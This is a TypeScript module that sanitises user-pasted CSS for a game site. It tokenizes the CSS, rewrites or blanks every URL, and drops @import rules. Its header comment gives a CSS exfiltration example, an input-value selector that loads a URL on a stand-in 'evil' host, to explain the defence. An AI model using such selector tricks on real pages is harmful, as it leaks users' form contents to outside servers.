// Copied from the website's apps/web/src/custom-css/rewrite.ts (bunnyhop main 374a6027) until the vendored web
// copy includes Custom CSS; then import it from ../../../web/src/custom-css/ instead. Keep it unchanged.

// Custom CSS (custom-css/index.ts): every URL in a player's CSS is rewritten before the browser sees it. DOM-free, tested
// in apps/web/test/custom-css.test.ts.
//
// WHY. CSS can't run code, but it can make requests that depend on the page: `input[value^="a"] { background:
// url(https://evil/a) }` tells a server one letter of a field, and a font's unicode-range tells it which characters are
// on screen. Pasted CSS comes from strangers, so no URL in it may ever be fetched by a rule matching or a glyph being
// drawn. What it may have:
//   - https:// (and http://) links: the game fetches each one once, up front, through /api/css-asset (which also keeps
//     the player's IP from the image host), and the CSS gets a blob: URL of the bytes instead. Whether a rule matches
//     no longer makes any request.
//   - data: URLs (no request at all) and #fragments (an SVG filter on the page).
//   - Anything else (relative paths, blob:, other schemes) is replaced with a transparent pixel.
// @import is dropped: paste the CSS itself.
//
// HOW. A tokenizer that follows CSS Syntax Level 3 (https://drafts.csswg.org/css-syntax-3/#tokenization), so escapes
// (`\75rl(`), unquoted url(...) and url( "..." ) are seen the way the browser sees them, comments and strings
// included. Rewritten: url tokens, url( / src( functions (one string inside, else the whole function goes), and strings
// directly inside image-set( / -webkit-image-set( / image( (the whole function goes if a var() / attr() / env() inside
// could put a string there). The output is scanned once more and refused unless every URL left is blob:, data: or #.

/** A transparent 1x1 GIF: what a URL that may not load becomes. */
export const BLANK = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

/** Longest custom CSS kept (UTF-16 units). Links, not pasted base64, are the way to bring images. */
export const MAX_CSS_CHARS = 256 * 1024;
/** Links per sheet that get fetched (icon sets like iconify's are one link per icon). */
export const MAX_REMOTE = 256;

export type UrlClass = { kind: "keep"; url: string } | { kind: "remote"; url: string } | { kind: "blocked"; url: string };

/** What a URL written in custom CSS may become. */
export function classifyUrl(raw: string): UrlClass {
  const url = raw.trim();
  if (/^#[^\s"'()\\]*$/.test(url) && url.length > 1) return { kind: "keep", url };
  if (/^data:/i.test(url)) return { kind: "keep", url };
  if (/^https?:\/\//i.test(url)) {
    try {
      const u = new URL(url);
      if ((u.protocol === "https:" || u.protocol === "http:") && !u.username && !u.password) return { kind: "remote", url: u.href };
    } catch {
      /* not a URL */
    }
  }
  return { kind: "blocked", url };
}

// ---------------------------------------------------------------------------------------------
// Tokenizer (only the token kinds the rewrite needs are told apart; the rest are "other")

type Tok =
  | { t: "ws" | "other" | "(" | ")" | "[" | "]" | "{" | "}" | ";"; s: number; e: number }
  | { t: "string" | "bad-string"; s: number; e: number; v: string }
  | { t: "url"; s: number; e: number; v: string }
  | { t: "bad-url"; s: number; e: number }
  | { t: "function" | "at" | "ident"; s: number; e: number; v: string };

const isHex = (c: string) => /^[0-9a-fA-F]$/.test(c);
const isDigit = (c: string) => c >= "0" && c <= "9";
const isWs = (c: string) => c === " " || c === "\t" || c === "\n";
const isIdentStart = (c: string) => /^[a-zA-Z_]$/.test(c) || (c !== "" && c.charCodeAt(0) >= 0x80);
const isIdent = (c: string) => isIdentStart(c) || isDigit(c) || c === "-";
const nonPrintable = (c: string) => {
  const n = c.charCodeAt(0);
  return (n >= 0 && n <= 8) || n === 0x0b || (n >= 0x0e && n <= 0x1f) || n === 0x7f;
};

/** The spec's preprocessing: CRLF / CR / FF are newlines, NUL is U+FFFD. */
export function preprocess(css: string): string {
  return css.replace(/\r\n?|\f/g, "\n").replace(/\0/g, "�");
}

function tokenize(src: string): Tok[] {
  const out: Tok[] = [];
  let i = 0;
  const at = (k: number) => src[k] ?? "";
  const validEscape = (k: number) => at(k) === "\\" && at(k + 1) !== "\n";
  const startsIdent = (k: number) => {
    const a = at(k);
    if (a === "-") return isIdentStart(at(k + 1)) || at(k + 1) === "-" || validEscape(k + 1);
    if (isIdentStart(a)) return true;
    return a === "\\" && validEscape(k);
  };
  const startsNumber = (k: number) => {
    const a = at(k);
    if (a === "+" || a === "-") return isDigit(at(k + 1)) || (at(k + 1) === "." && isDigit(at(k + 2)));
    if (a === ".") return isDigit(at(k + 1));
    return isDigit(a);
  };
  /** After the backslash. */
  const escape = (): string => {
    const c = at(i);
    if (c === "") return "�";
    if (isHex(c)) {
      let hex = "";
      while (hex.length < 6 && isHex(at(i))) hex += src[i++];
      if (isWs(at(i))) i++;
      const n = parseInt(hex, 16);
      return n === 0 || (n >= 0xd800 && n <= 0xdfff) || n > 0x10ffff ? "�" : String.fromCodePoint(n);
    }
    // A whole code point (surrogate pairs too).
    const cp = src.codePointAt(i)!;
    i += cp > 0xffff ? 2 : 1;
    return String.fromCodePoint(cp);
  };
  const identSeq = (): string => {
    let v = "";
    for (;;) {
      const c = at(i);
      if (isIdent(c)) (v += c), i++;
      else if (validEscape(i)) (i++, (v += escape()));
      else return v;
    }
  };
  const badUrlRemnants = () => {
    for (;;) {
      const c = at(i);
      if (c === "" || c === ")") return void (c && i++);
      if (validEscape(i)) (i++, escape());
      else i++;
    }
  };
  const urlToken = (s: number): Tok => {
    let v = "";
    while (isWs(at(i))) i++;
    for (;;) {
      const c = at(i);
      if (c === ")") return (i++, { t: "url", s, e: i, v });
      if (c === "") return { t: "url", s, e: i, v };
      if (isWs(c)) {
        while (isWs(at(i))) i++;
        if (at(i) === ")" || at(i) === "") {
          if (at(i)) i++;
          return { t: "url", s, e: i, v };
        }
        badUrlRemnants();
        return { t: "bad-url", s, e: i };
      }
      if (c === '"' || c === "'" || c === "(" || nonPrintable(c)) {
        badUrlRemnants();
        return { t: "bad-url", s, e: i };
      }
      if (c === "\\") {
        if (validEscape(i)) (i++, (v += escape()));
        else {
          badUrlRemnants();
          return { t: "bad-url", s, e: i };
        }
        continue;
      }
      v += c;
      i++;
    }
  };
  const identLike = (s: number): Tok => {
    const name = identSeq();
    if (name.toLowerCase() === "url" && at(i) === "(") {
      i++;
      while (isWs(at(i)) && isWs(at(i + 1))) i++;
      const q = (c: string) => c === '"' || c === "'";
      if (q(at(i)) || (isWs(at(i)) && q(at(i + 1)))) return { t: "function", s, e: i, v: name };
      return urlToken(s);
    }
    if (at(i) === "(") return (i++, { t: "function", s, e: i, v: name });
    return { t: "ident", s, e: i, v: name };
  };
  const string = (s: number, quote: string): Tok => {
    let v = "";
    for (;;) {
      const c = at(i);
      if (c === "") return { t: "string", s, e: i, v };
      if (c === quote) return (i++, { t: "string", s, e: i, v });
      if (c === "\n") return { t: "bad-string", s, e: i, v };
      if (c === "\\") {
        if (at(i + 1) === "") i++;
        else if (at(i + 1) === "\n") i += 2;
        else (i++, (v += escape()));
        continue;
      }
      v += c;
      i++;
    }
  };
  const number = () => {
    if (at(i) === "+" || at(i) === "-") i++;
    while (isDigit(at(i))) i++;
    if (at(i) === "." && isDigit(at(i + 1))) {
      i++;
      while (isDigit(at(i))) i++;
    }
    if ((at(i) === "e" || at(i) === "E") && (isDigit(at(i + 1)) || ((at(i + 1) === "+" || at(i + 1) === "-") && isDigit(at(i + 2))))) {
      i += 2;
      while (isDigit(at(i))) i++;
    }
    if (startsIdent(i)) identSeq();
    else if (at(i) === "%") i++;
  };

  while (i < src.length) {
    const s = i;
    const c = src[i];
    if (c === "/" && at(i + 1) === "*") {
      const end = src.indexOf("*/", i + 2);
      i = end < 0 ? src.length : end + 2;
      continue;
    }
    if (isWs(c)) {
      while (isWs(at(i))) i++;
      out.push({ t: "ws", s, e: i });
    } else if (c === '"' || c === "'") {
      i++;
      out.push(string(s, c));
    } else if (c === "#") {
      i++;
      if (isIdent(at(i)) || validEscape(i)) identSeq();
      out.push({ t: "other", s, e: i });
    } else if (c === "(" || c === ")" || c === "[" || c === "]" || c === "{" || c === "}" || c === ";") {
      i++;
      out.push({ t: c, s, e: i });
    } else if (startsNumber(i)) {
      number();
      out.push({ t: "other", s, e: i });
    } else if (c === "-" && at(i + 1) === "-" && at(i + 2) === ">") {
      i += 3;
      out.push({ t: "other", s, e: i });
    } else if (startsIdent(i)) {
      out.push(identLike(s));
    } else if (c === "<" && src.startsWith("<!--", i)) {
      i += 4;
      out.push({ t: "other", s, e: i });
    } else if (c === "@" && startsIdent(i + 1)) {
      i++;
      out.push({ t: "at", s, e: i, v: identSeq() });
    } else {
      i += src.codePointAt(i)! > 0xffff ? 2 : 1;
      out.push({ t: "other", s, e: i });
    }
  }
  return out;
}

// ---------------------------------------------------------------------------------------------
// Rewrite

/** `url("...")` with the value escaped for a CSS string. */
export const cssUrl = (v: string) => `url("${v.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\a ")}")`;

const OPENERS: Record<string, string> = { "(": ")", "[": "]", "{": "}", function: ")" };
/** Functions whose bare strings are image URLs. */
const STRING_IMAGES = new Set(["image-set", "-webkit-image-set", "image"]);
/** Functions that compute a value at use time (could hand image-set a string the rewrite never saw). */
const COMPUTED = new Set(["var", "env", "attr", "if", "inherit"]);

const computed = (x: Tok) => x.t === "function" && COMPUTED.has(x.v.toLowerCase());

/** The tokens directly inside the block opened at `k` and closed at `end` (nested blocks skipped). */
function direct(tokens: Tok[], k: number, end: number): Tok[] {
  const out: Tok[] = [];
  for (let j = k + 1; j < end; j++) {
    out.push(tokens[j]);
    if (tokens[j].t in OPENERS) j = blockEnd(tokens, j);
  }
  return out;
}

/** Index of the token that closes the block opened at `k` (or tokens.length). */
function blockEnd(tokens: Tok[], k: number): number {
  const stack: string[] = [OPENERS[tokens[k].t]];
  for (let j = k + 1; j < tokens.length; j++) {
    const t = tokens[j].t;
    if (t in OPENERS) stack.push(OPENERS[t]);
    else if (t === stack[stack.length - 1]) {
      stack.pop();
      if (!stack.length) return j;
    }
  }
  return tokens.length;
}

export interface RewriteResult {
  css: string;
  /** Every http(s) link in the CSS (normalised, first-seen order), whether or not `resolve` had bytes for it. */
  remote: string[];
  /** URLs replaced because they may not load (relative paths, other schemes). */
  blocked: string[];
  /** @import rules dropped. */
  imports: number;
}

/**
 * Rewrites every URL in `css`. `resolve(link)` gives the blob: URL for an http(s) link, or null when it has no bytes for
 * it (yet): then it becomes BLANK.
 */
export function rewriteCss(css: string, resolve: (link: string) => string | null = () => null): RewriteResult {
  const remote: string[] = [];
  const blocked: string[] = [];
  const target = (raw: string): string => {
    const c = classifyUrl(raw);
    if (c.kind === "keep") return c.url;
    if (c.kind === "blocked") {
      if (c.url && !blocked.includes(c.url)) blocked.push(c.url);
      return BLANK;
    }
    if (!remote.includes(c.url)) remote.push(c.url);
    const r = resolve(c.url);
    return r && /^blob:/i.test(r) ? r : BLANK;
  };
  const { css: out, imports } = mapUrls(css, target, true);
  return { css: out, remote, blocked, imports };
}

/**
 * Every URL in `css` (url tokens, url( / src( strings, strings directly in image-set) through `map`; @import rules
 * dropped when `dropImports`, else left as written for imports.ts to expand.
 */
function mapUrls(css: string, map: (raw: string) => string, dropImports: boolean): { css: string; imports: number } {
  const src = preprocess(css);
  const tokens = tokenize(src);
  let imports = 0;
  let out = "";
  let copied = 0;
  const replace = (from: number, to: number, text: string) => {
    out += src.slice(copied, from) + text;
    copied = to;
  };

  /** Rewrites tokens [a, b). */
  const walk = (a: number, b: number) => {
    for (let k = a; k < b; k++) {
      const tok = tokens[k];
      if (tok.t === "url") replace(tok.s, tok.e, cssUrl(map(tok.v)));
      else if (tok.t === "bad-url") replace(tok.s, tok.e, cssUrl(BLANK));
      else if (dropImports && tok.t === "at" && tok.v.toLowerCase() === "import") {
        // To the ; that ends it at the top level (or the end of the sheet).
        let j = k + 1;
        while (j < tokens.length && tokens[j].t !== ";") j = tokens[j].t in OPENERS ? blockEnd(tokens, j) + 1 : j + 1;
        replace(tok.s, j < tokens.length ? tokens[j].e : src.length, "");
        imports++;
        k = j;
      } else if (tok.t === "function") {
        const name = tok.v.toLowerCase();
        const end = blockEnd(tokens, k);
        const close = end < tokens.length ? tokens[end].e : src.length;
        if (name === "url" || name === "src") {
          const inner = tokens.slice(k + 1, end).filter((x) => x.t !== "ws");
          replace(tok.s, close, cssUrl(inner.length === 1 && inner[0].t === "string" ? map(inner[0].v) : BLANK));
          k = end;
        } else if (STRING_IMAGES.has(name)) {
          if (tokens.slice(k + 1, end).some(computed)) replace(tok.s, close, cssUrl(BLANK));
          else {
            // Strings directly inside are URLs; nested functions (type("image/png"), url()) get the normal rules.
            for (let j = k + 1; j < end; j++) {
              const x = tokens[j];
              if (x.t === "string") replace(x.s, x.e, cssUrl(map(x.v)));
              else if (x.t in OPENERS) {
                const e2 = blockEnd(tokens, j);
                walk(j, Math.min(e2 + 1, end));
                j = e2;
              } else walk(j, j + 1);
            }
          }
          k = end;
        }
        // Any other function: its contents are walked as the loop goes on.
      }
      // Everything else is copied as written.
    }
  };
  walk(0, tokens.length);
  out += src.slice(copied);
  return { css: out, imports };
}

/**
 * Relative URLs in a file fetched from `base` (an imported theme) made absolute, as the browser would resolve them for
 * a stylesheet at that address. data: and #fragments stay; @import rules stay for imports.ts.
 */
export function absolutizeUrls(css: string, base: string): string {
  return mapUrls(
    css,
    (raw) => {
      const v = raw.trim();
      if (!v || /^(data:|#)/i.test(v)) return v;
      try {
        return new URL(v, base).href;
      } catch {
        return v;
      }
    },
    false,
  ).css;
}

export interface ImportRule {
  /** Where the whole rule is in the preprocessed text (from @ to ;). */
  from: number;
  to: number;
  /** The address as written (relative to the file's own address). */
  url: string;
  /** What follows the address: layer / layer(name), supports(...), then a media query list. */
  condition: string;
}

/** The @import rules of a sheet, at its top level (where the browser honours them), in order. */
export function findImports(css: string): { src: string; rules: ImportRule[] } {
  const src = preprocess(css);
  const tokens = tokenize(src);
  const rules: ImportRule[] = [];
  for (let k = 0; k < tokens.length; k++) {
    const tok = tokens[k];
    if (tok.t === "{" || tok.t === "(" || tok.t === "[" || tok.t === "function") {
      k = blockEnd(tokens, k);
      continue;
    }
    if (tok.t !== "at" || tok.v.toLowerCase() !== "import") continue;
    let j = k + 1;
    while (j < tokens.length && tokens[j].t === "ws") j++;
    const a = tokens[j];
    let url: string | null = null;
    let afterUrl = j + 1;
    if (a?.t === "url" || a?.t === "string") url = a.v;
    else if (a?.t === "function" && a.v.toLowerCase() === "url") {
      const end = blockEnd(tokens, j);
      const inner = tokens.slice(j + 1, end).filter((x) => x.t !== "ws");
      if (inner.length === 1 && inner[0].t === "string") url = inner[0].v;
      afterUrl = end + 1;
    }
    let semi = afterUrl;
    while (semi < tokens.length && tokens[semi].t !== ";") semi = tokens[semi].t in OPENERS ? blockEnd(tokens, semi) + 1 : semi + 1;
    const to = semi < tokens.length ? tokens[semi].e : src.length;
    const condEnd = semi < tokens.length ? tokens[semi].s : src.length;
    if (url !== null) rules.push({ from: tok.s, to, url, condition: src.slice(afterUrl < tokens.length ? tokens[afterUrl].s : src.length, condEnd).trim() });
    k = semi;
  }
  return { src, rules };
}

/** Every URL left in rewritten CSS is blob:, data: or #fragment (the check before a sheet is applied). */
export function onlySafeUrls(css: string): boolean {
  const tokens = tokenize(preprocess(css));
  const ok = (v: string) => /^(blob:|data:|#)/i.test(v.trim());
  for (let k = 0; k < tokens.length; k++) {
    const tok = tokens[k];
    if (tok.t === "url" && !ok(tok.v)) return false;
    if (tok.t === "at" && tok.v.toLowerCase() === "import") return false;
    if (tok.t !== "function") continue;
    const name = tok.v.toLowerCase();
    const end = blockEnd(tokens, k);
    if (name === "url" || name === "src") {
      const inner = tokens.slice(k + 1, end).filter((x) => x.t !== "ws");
      if (!(inner.length === 1 && inner[0].t === "string" && ok(inner[0].v))) return false;
    } else if (STRING_IMAGES.has(name)) {
      if (tokens.slice(k + 1, end).some(computed)) return false;
      for (const x of direct(tokens, k, end)) if (x.t === "string" && !ok(x.v)) return false;
    }
  }
  return true;
}
